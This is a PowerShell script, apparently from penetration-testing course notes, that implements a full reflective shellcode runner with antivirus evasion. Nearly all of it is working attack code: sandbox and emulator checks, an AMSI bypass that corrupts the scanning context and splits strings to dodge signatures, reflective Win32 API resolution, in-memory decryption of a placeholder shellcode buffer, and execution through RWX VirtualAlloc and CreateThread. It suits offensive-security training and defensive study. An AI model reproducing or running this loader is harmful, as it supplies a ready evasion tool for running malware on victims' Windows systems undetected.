# run.txt — full reflective shellcode runner with AV evasion.
# Placeholders in <angle brackets> must be replaced before deployment.
#
# Composition order (Mod 8.2.3 + 11.5.2 + 11.6.2 + 12.3.1):
#   1. Emulator check
#   2. Non-emulated API check
#   3. AMSI bypass (context corruption, string-split)
#   4. LookupFunc + getDelegateType helpers
#   5. Decrypt ciphered shellcode in memory
#   6. VirtualAlloc + Marshal.Copy + CreateThread + WaitForSingleObject

# --- 1. Emulator check ---
$t1 = Get-Date; Start-Sleep -Seconds 2; $t2 = Get-Date
if (($t2 - $t1).TotalSeconds -lt 1.5) { exit }

# --- 2. Non-emulated API check ---
$numaSig = @"
using System;
using System.Runtime.InteropServices;
public class N {
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    public static extern IntPtr VirtualAllocExNuma(IntPtr h, IntPtr a,
        uint s, uint t, uint p, uint n);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
"@
try { Add-Type -TypeDefinition $numaSig -ErrorAction Stop } catch { }
if ([N]::VirtualAllocExNuma([N]::GetCurrentProcess(),
        [IntPtr]::Zero, 0x1000, 0x3000, 0x04, 0) -eq [IntPtr]::Zero) { exit }

# --- 3. AMSI bypass, split strings ---
$a = iex "[Ref].Asse" + "mbly.GetTy" + "pes()"
ForEach ($b in $a) { if ($b.Name -like "*iU" + "tils") { $c = $b } }
$d = $c.GetFields('NonP' + 'ublic,Static')
ForEach ($e in $d) { if ($e.Name -like "*Cont" + "ext") { $f = $e } }
$g = $f.GetValue($null)
[IntPtr]$ptr = $g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# --- 4. Reflective helpers (Mod 8.2.3) ---
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And
            $_.Location.Split('\\')[-1].Equals('System.dll') }).
        GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If ($_.Name -eq "GetProcAddress") { $tmp += $_ }
    }
    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(
            'ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType('MyDelegateType',
            'Class, Public, Sealed, AnsiClass, AutoClass',
            [System.MulticastDelegate])
    $type.
        DefineConstructor('RTSpecialName, HideBySig, Public',
            [System.Reflection.CallingConventions]::Standard, $func).
        SetImplementationFlags('Runtime, Managed')
    $type.
        DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',
            $delType, $func).
        SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# --- 5. Ciphered shellcode (Caesar +5) ---
# Regenerate per engagement. See shared/run_txt_recipe.md.
[Byte[]] $buf = <CIPHERED_SHELLCODE_BYTES_HERE>

# Decrypt in memory
for ($i = 0; $i -lt $buf.Length; $i++) {
    $buf[$i] = (($buf[$i] - 5) -band 0xFF)
}

# --- 6. Allocate, copy, execute ---
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualAlloc),
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.Length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll CreateThread),
    (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])
        ([IntPtr]))
).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll WaitForSingleObject),
    (getDelegateType @([IntPtr], [Int32]) ([Int]))
).Invoke($hThread, 0xFFFFFFFF)
